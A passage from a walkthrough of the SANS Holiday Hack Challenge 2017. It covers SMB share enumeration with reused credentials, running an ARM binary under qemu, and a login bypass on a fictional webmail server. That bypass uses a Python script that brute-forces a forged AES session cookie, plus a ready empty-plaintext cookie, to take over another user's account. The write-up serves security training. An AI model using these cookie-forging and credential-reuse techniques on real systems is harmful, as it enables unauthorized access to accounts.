<img alt="cryokinetic_magic_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/cryokinetic_magic_snowball.gif" />
</div>
</div>
<div class="section" id="north-pole-christmas-town-infrastructure-smb-server">
<h3><a class="toc-backref" href="#id33">North Pole Christmas Town infrastructure: SMB server</a></h3>
<p>If we take a look at the <code>nmap</code> scan, we can see that a server called
<code>hhc17-smb-server.c.holidayhack2017.internal</code>. This must be an SMB
server used to share some files. Let's try to connect to it using Alabaster
Snowball's credentials. To do this, I'm using <code>proxychains</code>, and
<a class="reference external" href="https://twitter.com/byt3bl33d3r">&#64;byt3bl33d3r</a>'s excellent
<code>CrackMapExec</code>:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> proxychains cme <span class="m">10</span>.142.0.7 -u alabaster_snowball -p stream_unhappy_buy_loss --shares
<span class="go">ProxyChains-3.1 (http://proxychains.sf.net)</span>
<span class="go">|S-chain|-&lt;&gt;-127.0.0.1:4242-&lt;&gt;&lt;&gt;-10.142.0.7:445-&lt;&gt;&lt;&gt;-OK</span>
<span class="go">CME          10.142.0.7:445 HHC17-EMI       [*] Windows 10.0 Build 14393 (name:HHC17-EMI) (domain:HHC17-EMI)</span>
<span class="go">|S-chain|-&lt;&gt;-127.0.0.1:4242-&lt;&gt;&lt;&gt;-10.142.0.7:445-&lt;&gt;&lt;&gt;-OK</span>
<span class="go">|S-chain|-&lt;&gt;-127.0.0.1:4242-&lt;&gt;&lt;&gt;-10.142.0.7:445-&lt;&gt;&lt;&gt;-OK</span>
<span class="go">CME          10.142.0.7:445 HHC17-EMI       [+] HHC17-EMI\alabaster_snowball:stream_unhappy_buy_loss</span>
<span class="go">CME          10.142.0.7:445 HHC17-EMI       [+] Enumerating shares</span>
<span class="go">CME          10.142.0.7:445 HHC17-EMI       SHARE           Permissions</span>
<span class="go">CME          10.142.0.7:445 HHC17-EMI       -----           -----------</span>
<span class="hll"><span class="go">CME          10.142.0.7:445 HHC17-EMI       FileStor        READ</span>
</span><span class="go">CME          10.142.0.7:445 HHC17-EMI       ADMIN$          NO ACCESS</span>
<span class="go">CME          10.142.0.7:445 HHC17-EMI       IPC$            READ</span>
<span class="go">CME          10.142.0.7:445 HHC17-EMI       C$              NO ACCESS</span>
</pre></div>
<p>Hmm, we have read access to the <code>FileStor</code> share. Let's connect to it.
I'm using <a class="reference external" href="https://github.com/CoreSecurity/impacket">impacket</a>'s
<code>smbclient.py</code>:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> proxychains smbclient.py alabaster_snowball:stream_unhappy_buy_loss@10.142.0.7
<span class="go">ProxyChains-3.1 (http://proxychains.sf.net)</span>
<span class="go">Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies</span>

<span class="go">|S-chain|-&lt;&gt;-127.0.0.1:4242-&lt;&gt;&lt;&gt;-10.142.0.7:445-&lt;&gt;&lt;&gt;-OK</span>
<span class="go">Type help for list of commands</span>
<span class="gp">#</span> use FileStor
<span class="gp">#</span> ls
<span class="go">drw-rw-rw-          0  Mon Dec 25 05:09:11 2017 .</span>
<span class="go">drw-rw-rw-          0  Mon Dec 25 05:09:11 2017 ..</span>
<span class="go">-rw-rw-rw-     255520  Mon Dec 25 05:09:28 2017 BOLO - Munchkin Mole Report.docx</span>
<span class="hll"><span class="go">-rw-rw-rw-    1275756  Mon Dec  4 21:04:34 2017 GreatBookPage3.pdf</span>
</span><span class="go">-rw-rw-rw-     133295  Wed Dec  6 22:47:47 2017 MEMO - Password Policy Reminder.docx</span>
<span class="go">-rw-rw-rw-      10245  Wed Dec  6 23:28:21 2017 Naughty and Nice List.csv</span>
<span class="go">-rw-rw-rw-      60344  Wed Dec  6 22:51:47 2017 Naughty and Nice List.docx</span>
</pre></div>
<p>Among other files that may be useful later, we find the <a class="reference external" href="/docs/sans-christmas-challenge-2017/GreatBookPage3.pdf">third page to The
Great Book</a>
(sha256: <code>6b99d47103d4030e643c8073dfab0915b0bf1a265c32035ec604148abd49d64e</code>):</p>
<blockquote>
<p>The Great Schism</p>
<p>Many centuries ago, the Little People of Oz were united - one people
sharing peace and laughter all the way. But then, tragedy struck - The
Great Schism split the community into two bitterly opposed factions: the
Munchkins and the Elves. The original cause of this acrimonious division
has long been forgotten.</p>
<p>As The Great Schism escalated from verbal arguments to fist fights to the
rise of actual armed militias, the Wizard knew he had to act. He reached
out to his good friend, Santa Claus, who at the time was setting up a
worldwide gift distribution operation at the North Pole. To avoid the
near-certain bloodshed of an Oz-wide civil war, the Wizard and Santa agreed
that they would relocate the Elven faction to the North, where they would
help Santa manufacture presents and run the North Pole's infrastructure.
The Munchkins would remain in Oz, living as before, but viewing the Elves'
departure as a banishment. The Elves themselves regard their move as
a magnanimous and voluntary relocation to the North Pole, seeking refuge
from marauding Munchkins.</p>
<p>Sadly, although violence between the Munchkins and the Elves was thwarted,
there remains a seething hatred between the two peoples. Despite the best
efforts of Santa and the Wizard of Oz, anti-Elf propaganda appears from
time to time in Oz, as does anti-Munchkin sentiment in the North Pole.
Indeed, the two peoples remain in a perpetual state of cold ward. Sadly,
the chilling after-affects of The Great Schism are felt to this very day.</p>
</blockquote>
</div>
</div>
<div class="section" id="fourth-page-of-the-great-book">
<h2><a class="toc-backref" href="#id34">Fourth page of <em>The Great Book</em></a></h2>
<div class="section" id="north-pole-and-beyond-there-s-snow-place-like-home">
<h3><a class="toc-backref" href="#id35">North Pole and Beyond: There's Snow Place Like Home</a></h3>
<div class="section" id="cranberry-pi">
<h4><a class="toc-backref" href="#id36">Cranberry Pi</a></h4>
<pre class="literal-block">
                             ______
                          .-&quot;&quot;&quot;&quot;.._'.       _,##
                   _..__ |.-&quot;&quot;&quot;-.|  |   _,##'`-._
                  (_____)||_____||  |_,##'`-._,##'`
                  _|   |.;-&quot;&quot;-.  |  |#'`-._,##'`
               _.;_ `--' `\    \ |.'`\._,##'`
              /.-.\ `\     |.-&quot;;.`_, |##'`
              |\__/   | _..;__  |'-' /
              '.____.'_.-`)\--' /'-'`
               //||\\(_.-'_,'-'`
             (`-...-')_,##'`
      jgs _,##`-..,-;##`
       _,##'`-._,##'`
    _,##'`-._,##'`
      `-._,##'`
My name is Pepper Minstix, and I need your help with my plight.
I've crashed the Christmas toy train, for which I am quite contrite.
I should not have interfered, hacking it was foolish in hindsight.
If you can get it running again, I will reward you with a gift of delight.
</pre>
<p>Alright, once again, we're supposed to execute a program. Let's see:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@36ff87294cc6:~$</span> ls -lh
<span class="go">total 444K</span>
<span class="go">-rwxr-xr-x 1 root root 444K Dec  7 18:43 trainstartup</span>
<span class="gp">elf@a6b0a5dfef57:~$</span> ./trainstartup
<span class="go">bash: ./trainstartup: cannot execute binary file: Exec format error</span>
<span class="gp">elf@a6b0a5dfef57:~$</span> file ./trainstartup
<span class="go">./trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped</span>
<span class="gp">elf@a6b0a5dfef57:~$</span> uname -a
<span class="go">Linux a6b0a5dfef57 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux</span>
</pre></div>
<p>Hmm, just like for the <code>find</code> executable in &quot;Winter Wonder Landing&quot;,
we're stuck with an ARM program, while we're running on an Intel x64 processor.
However, we can't replace this program with an x64 version, since it's a
custom program! We must find a way to execute ARM on an Intel x64 processor.</p>
<p>This usually means that we have to use some kind of virtualization solution.
One virtualization solution that works in CLI, and can launch program
independently, without having to virtualize a whole OS is QEMU. Let's see if
the machine has QEMU:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@a6b0a5dfef57:~$</span> find / -name <span class="s1">&#39;qemu*&#39;</span> <span class="m">2</span>&gt; /dev/null
<span class="hll"><span class="go">/usr/bin/qemu-arm</span>
</span><span class="go">/usr/bin/qemu-alpha</span>
<span class="go">/usr/bin/qemu-sh4eb</span>
<span class="go">/usr/bin/qemu-mips</span>
<span class="go">/usr/bin/qemu-aarch64</span>
<span class="go">/usr/bin/qemu-sparc32plus</span>
<span class="go">/usr/bin/qemu-m68k</span>
<span class="go">/usr/bin/qemu-microblazeel</span>
<span class="go">/usr/bin/qemu-ppc64</span>
<span class="go">/usr/bin/qemu-mipsn32</span>
<span class="go">/usr/bin/qemu-microblaze</span>
<span class="go">/usr/bin/qemu-mips64</span>
<span class="go">/usr/bin/qemu-sparc64</span>
<span class="go">/usr/bin/qemu-s390x</span>
<span class="go">/usr/bin/qemu-mips64el</span>
<span class="go">/usr/bin/qemu-mipsel</span>
<span class="go">/usr/bin/qemu-cris</span>
<span class="go">/usr/bin/qemu-armeb</span>
<span class="go">/usr/bin/qemu-sparc</span>
<span class="go">/usr/bin/qemu-unicore32</span>
<span class="go">/usr/bin/qemu-x86_64</span>
<span class="go">/usr/bin/qemu-mipsn32el</span>
<span class="go">/usr/bin/qemu-ppc64abi32</span>
<span class="go">/usr/bin/qemu-sh4</span>
<span class="go">/usr/bin/qemu-i386</span>
<span class="go">/usr/bin/qemu-ppc</span>
<span class="go">/usr/bin/qemu-or32</span>
<span class="go">[snip]</span>
</pre></div>
<p>Yes, <code>qemu-arm</code> is present, we can try and launch our program:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@a6b0a5dfef57:~$</span> /usr/bin/qemu-arm ./trainstartup
<span class="go">Starting up...</span>

<span class="go">    Merry Christmas</span>
<span class="go">    Merry Christmas</span>
<span class="go">v</span>
<span class="gp">&gt;</span>*&lt;
<span class="go">^</span>
<span class="go">/o\</span>
<span class="go">/   \               @.·</span>
<span class="go">/~~   \                .</span>
<span class="go">/ ° ~~  \         · .</span>
<span class="go">/      ~~ \       ◆  ·</span>
<span class="go">/     °   ~~\    ·     0</span>
<span class="go">/~~           \   .─··─ · o</span>
<span class="go">             /°  ~~  .*· · . \  ├──┼──┤</span>
<span class="go">              │  ──┬─°─┬─°─°─°─ └──┴──┘</span>
<span class="go">≠==≠==≠==≠==──┼──=≠     ≠=≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠===≠</span>
<span class="go">              │   /└───┘\┌───┐       ┌┐</span>
<span class="go">                         └───┘    /▒▒▒▒</span>
<span class="go">≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠=°≠=°≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠</span>
<span class="go">You did it! Thank you!</span>
</pre></div>
</div>
<div class="section" id="id7">
<h4><a class="toc-backref" href="#id37">Redirecting the snowball</a></h4>
<p>Since we managed to execute the program, we're given an object: Jam, which
does... something? I dunno, but apparently it should not be confused with
reindeer droppings.</p>
<img alt="there_s_snow_place_like_home_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/there_s_snow_place_like_home_terminal.png" />
<p>Now here's the layout I used to redirect the snowball:</p>
<img alt="there_s_snow_place_like_home_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/there_s_snow_place_like_home_snowball.gif" />
</div>
</div>
<div class="section" id="north-pole-christmas-town-infrastructure-elf-web-access">
<h3><a class="toc-backref" href="#id38">North Pole Christmas Town infrastructure: Elf Web Access</a></h3>
<p>If we take another look at the <code>nmap</code> scan result, we can find a server
called <code>mail.northpolechristmastown.com</code>. This is obviously the North
Pole mail server. Let's see what we can find.</p>
<p>If we try to connect with Alabaster's password, we get an <code>Incorrect
password</code> message. Great, the guy reuses his password for his MySQL account,
his system account, and his SMB account, but not his mail account. Let's find
another way.</p>
<img alt="ewa_failed_login.png" class="align-center" src="/images/sans-christmas-challenge-2017/ewa_failed_login.png" />
<p>After trying to bypass authentication for quite some time, I decided to go
back to basic recon. By looking at the source code of the application, we
find a reference to a webpage called <code>account.html</code>:</p>
<div class="highlight"><pre><span></span><span class="c1">// File custom.js</span>
<span class="kd">function</span> <span class="nx">login</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">address</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#email&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">().</span><span class="nx">trim</span><span class="p">();</span>
    <span class="kd">var</span> <span class="nx">passw</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#password&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">().</span><span class="nx">trim</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">address</span> <span class="o">&amp;&amp;</span> <span class="nx">passw</span> <span class="o">&amp;&amp;</span> <span class="nx">address</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/[\w\_\-\.]+\@[\w\_\-\.]+\.\w\w\w?\w?/g</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span> <span class="s2">&quot;login.js&quot;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">email</span><span class="o">:</span> <span class="nx">address</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="nx">passw</span> <span class="p">}).</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span> <span class="nx">result</span> <span class="p">)</span> <span class="p">{</span>
            <span class="c1">//RETURN A JSON bool value of true if the email and password is correct. false if incorrect</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#email&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
                <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#password&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
                <span class="nx">Materialize</span><span class="p">.</span><span class="nx">toast</span><span class="p">(</span><span class="s1">&#39;Correct. Logging in now!&#39;</span><span class="p">,</span> <span class="mi">4000</span><span class="p">);</span>
                <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
                    <span class="c1">//redirect to home.html. This needs to be locked down by cookies!</span>
<span class="hll">                    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s1">&#39;account.html&#39;</span><span class="p">;</span>
</span>                <span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">Materialize</span><span class="p">.</span><span class="nx">toast</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">result</span><span class="p">,</span> <span class="mi">4000</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}).</span><span class="nx">fail</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">Materialize</span><span class="p">.</span><span class="nx">toast</span><span class="p">(</span><span class="s1">&#39;Error: &#39;</span><span class="o">+</span><span class="nx">error</span><span class="p">.</span><span class="nx">status</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="nx">error</span><span class="p">.</span><span class="nx">statusText</span><span class="p">,</span> <span class="mi">4000</span><span class="p">);</span>
        <span class="p">})</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">Materialize</span><span class="p">.</span><span class="nx">toast</span><span class="p">(</span><span class="s1">&#39;You must put in a correct email and password!&#39;</span><span class="p">,</span> <span class="mi">4000</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>But trying to go directly to this page just redirects us to the login page.
Let's continue our recon. Here's what we find in the <code>robots.txt</code> file:</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/robots.txt</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">10.142.0.5</span>
<span class="hll"><span class="na">Cookie</span><span class="o">:</span> <span class="l">EWA={&quot;name&quot;:&quot;GUEST&quot;,&quot;plaintext&quot;:&quot;&quot;,&quot;ciphertext&quot;:&quot;&quot;}</span>
</span><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.3 (Ubuntu)</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 28 Dec 2017 20:29:07 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/plain; charset=UTF-8</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">37</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="hll"><span class="na">X-Powered-By</span><span class="o">:</span> <span class="l">Express</span>
</span>
User-agent: *
<span class="hll">Disallow: /cookie.txt
</span></pre></div>
<p>Couple of interesting things. First, the application set us a cookie called
<code>EWA</code>, with what seems to be our access level. I tried replaying the
cookie with values such as <code>ADMIN</code>, etc. but it didn't work. Second, the
application is using the Express framework, which is based on NodeJS. We
now know the backend of the application. And finally, there is a file called
<code>cookie.txt</code> in the application webroot, and the developper didn't want
this file to be indexed by search engine bots. So I guess it must be
interesting! Let's see.</p>
<p>The file contains the following Javascript code:</p>
<div class="highlight"><pre><span></span><span class="c1">//FOUND THESE FOR creating and validating cookies. Going to use this in node js</span>
    <span class="kd">function</span> <span class="nx">cookie_maker</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">callback</span><span class="p">){</span>
        <span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="s1">&#39;need to put any length key in here&#39;</span><span class="p">;</span>
        <span class="c1">//randomly generates a string of 5 characters</span>
        <span class="kd">var</span> <span class="nx">plaintext</span> <span class="o">=</span> <span class="nx">rando_string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
        <span class="c1">//makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters</span>
        <span class="c1">//Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.</span>
        <span class="kd">var</span> <span class="nx">ciphertext</span> <span class="o">=</span> <span class="nx">aes256</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">plaintext</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\=/g</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
        <span class="c1">//Setting the values of the cookie.</span>
        <span class="kd">var</span> <span class="nx">acookie</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;IOTECHWEBMAIL&#39;</span><span class="p">,</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="s2">&quot;name&quot;</span><span class="o">:</span><span class="nx">username</span><span class="p">,</span> <span class="s2">&quot;plaintext&quot;</span><span class="o">:</span><span class="nx">plaintext</span><span class="p">,</span>  <span class="s2">&quot;ciphertext&quot;</span><span class="o">:</span><span class="nx">ciphertext</span><span class="p">}),</span> <span class="p">{</span> <span class="nx">maxAge</span><span class="o">:</span> <span class="mi">86400000</span><span class="p">,</span> <span class="nx">httpOnly</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">encode</span><span class="o">:</span> <span class="nb">String</span> <span class="p">}]</span>
        <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">acookie</span><span class="p">);</span>
    <span class="p">};</span>
    <span class="kd">function</span> <span class="nx">cookie_checker</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">callback</span><span class="p">){</span>
        <span class="k">try</span><span class="p">{</span>
            <span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="s1">&#39;need to put any length key in here&#39;</span><span class="p">;</span>
            <span class="c1">//Retrieving the cookie from the request headers and parsing it as JSON</span>
            <span class="kd">var</span> <span class="nx">thecookie</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">IOTECHWEBMAIL</span><span class="p">);</span>
            <span class="c1">//Retrieving the cipher text</span>
            <span class="kd">var</span> <span class="nx">ciphertext</span> <span class="o">=</span> <span class="nx">thecookie</span><span class="p">.</span><span class="nx">ciphertext</span><span class="p">;</span>
            <span class="c1">//Retrievingin the username</span>
            <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">thecookie</span><span class="p">.</span><span class="nx">name</span>
            <span class="c1">//retrieving the plaintext</span>
            <span class="kd">var</span> <span class="nx">plaintext</span> <span class="o">=</span> <span class="nx">aes256</span><span class="p">.</span><span class="nx">decrypt</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">ciphertext</span><span class="p">);</span>
            <span class="c1">//If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">plaintext</span> <span class="o">===</span> <span class="nx">thecookie</span><span class="p">.</span><span class="nx">plaintext</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nx">username</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
            <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">};</span>
</pre></div>
<p>So, we seem to have found the code that is use to generate the <code>EWA</code>
cookie. Here's how it seems to work:</p>
<ol class="arabic simple">
<li>The server generates a five-letter random string (variable <code>plaintext</code>).</li>
<li>This string is encrypted using AES256 (variable <code>ciphertext</code>, with a fixed key (variable <code>key</code>).</li>
<li>The username, the random string, and its encrypted value, are put in the cookie.</li>
<li>To check the cookie, the server decrypts the encrypted value, and compares it to the random string sent in the cookie.</li>
</ol>
<p>At first, I tried generating a cookie, using the key <code>need to put any length key in here</code>,
hoping that the developper had not changed this section of the source code, but
it didn't work. So we don't know the key. But there are still some glaring
errors in this cookie generation code.</p>
<p>First, let's take a look at the <a class="reference external" href="https://www.npmjs.com/package/aes256">aes256 NodeJS module</a>.
I installed NodeJS and this module, and played around with it:</p>
<div class="highlight"><pre><span></span><span class="o">&gt;</span> <span class="kd">var</span> <span class="nx">aes256</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;aes256&#39;</span><span class="p">);</span>
<span class="kc">undefined</span>
<span class="o">&gt;</span> <span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="s1">&#39;my milkshake brings all the boys to the yard&#39;</span><span class="p">;</span>
<span class="kc">undefined</span>
<span class="o">&gt;</span> <span class="kd">var</span> <span class="nx">plaintext</span> <span class="o">=</span> <span class="s1">&#39;1337&#39;</span><span class="p">;</span>
<span class="kc">undefined</span>
<span class="o">&gt;</span> <span class="nx">aes256</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">plaintext</span><span class="p">)</span>
<span class="s1">&#39;L07kb9VSHbavnunjI/4aom8KcS4=&#39;</span>
</pre></div>
<p>Let's take a look at our ciphertext:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span>  <span class="nb">echo</span> <span class="s1">&#39;L07kb9VSHbavnunjI/4aom8KcS4=&#39;</span> <span class="p">|</span> base64 -d <span class="p">|</span> hexdump -C
<span class="go">00000000  2f 4e e4 6f d5 52 1d b6  af 9e e9 e3 23 fe 1a a2  |/N.o.R......#...|</span>
<span class="go">00000010  6f 0a 71 2e                                       |o.q.|</span>
<span class="go">00000014</span>
</pre></div>
<p>Hmmm, our output is 20 bytes, which is not a multiple of AES block-size. This
is weird. The first block of our ciphertext (16 bytes) must be the
initialization vector, which leaves a 4-byte block. Incidently, 4 bytes is
exactly the size of our plaintext. After several manual tries, I confirmed that
the plaintext and the ciphertext have the same size, which is the first oops.</p>
<p>The second oops is that the cookie verification code does not perform any check
on the payload sent in the cookie. So it will happily accept one-byte long
payload <span class="strike">(but unfortunately, not empty payload)</span> <strong>(it actually does,
see after)</strong>.</p>
<p>So, if we send a one-byte long payload, there are only 256 possible values for
the ciphertext, which is easily bruteforceable on line. Here's a Python script
that will try to find a valid cookie:</p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>

<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="c1"># The URL we try to access</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://10.142.0.5/account.html&#39;</span>

    <span class="c1"># Our cookie template, with a one-byte long plaintext</span>
    <span class="n">cookie_template</span> <span class="o">=</span> <span class="s1">&#39;{{&quot;name&quot;:&quot;alabaster.snowball@northpolechristmastown.com&quot;,&quot;plaintext&quot;:&quot;a&quot;,&quot;ciphertext&quot;:&quot;{}&quot;}}&#39;</span>

    <span class="c1"># Our arbitrary IV</span>
    <span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">16</span>

    <span class="k">for</span> <span class="n">candidate</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="c1"># We create our candidate cipher text, by appending the one-byte value</span>
        <span class="c1"># to our IV, and base64 encoding it</span>
        <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">iv</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">candidate</span><span class="p">]))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span>

        <span class="c1"># We then create our cookie, and get the wanted page</span>
        <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;EWA&#39;</span><span class="p">:</span> <span class="n">cookie_template</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>

        <span class="c1"># If we get a positive return, we output the cookie</span>
        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="o">!=</span> <span class="s1">&#39;&lt;script&gt;window.location.href=</span><span class="se">\&#39;</span><span class="s1">/</span><span class="se">\&#39;</span><span class="s1">&lt;/script&gt;&#39;</span><span class="p">::</span>
            <span class="k">print</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span>
            <span class="k">break</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>
<p>We launch our script through <code>proxychains</code> and...</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> proxychains ./cookie_finder.py
<span class="go">ProxyChains-3.1 (http://proxychains.sf.net)</span>
<span class="go">|S-chain|-&lt;&gt;-127.0.0.1:4242-&lt;&gt;&lt;&gt;-10.142.0.5:80-&lt;&gt;&lt;&gt;-OK</span>
<span class="go">[snip]</span>
<span class="go">{&#39;EWA&#39;: &#39;{&quot;name&quot;:&quot;alabaster.snowball@northpolechristmastown.com&quot;,&quot;plaintext&quot;:&quot;a&quot;,&quot;ciphertext&quot;:&quot;kJCQkJCQkJCQkJCQkJCQkGk=&quot;}&#39;}</span>
</pre></div>
<p>Bingo! We get a valid cookie for Alabaster's account!</p>
<p><strong>&lt;Errata&gt;</strong></p>
<p>After solving this part, I checked the hints given by the Elf of this level,
Pepper Minstix:</p>
<blockquote>
<p>AES256? Honestly, I don't know much about it, but Alabaster explained the
basic idea and it sounded easy. During decryption, the first 16 bytes are
removed and used as the initialization vector or &quot;IV.&quot; Then the IV + the
secret key are used with AES256 to decrypt the remaining bytes of the
encrypted string.</p>
<p>Hmmm. That's a good question, I'm not sure what would happen if the
encrypted string was only 16 bytes long.</p>
</blockquote>
<p>So the system does in fact accept empty <code>plaintext</code> variables, with
any <code>ciphertext</code> that is 16-byte long. So using this cookie works:
<code>{&quot;name&quot;:&quot;alabaster.snowball&#64;northpolechristmastown.com&quot;,&quot;plaintext&quot;:&quot;&quot;,&quot;ciphertext&quot;:&quot;QUFBQUFBQUFBQUFBQUFBQQo=&quot;}</code>.</p>
<p>I was sure to have checked this, but obviously I'm mistaken (that's an oops for
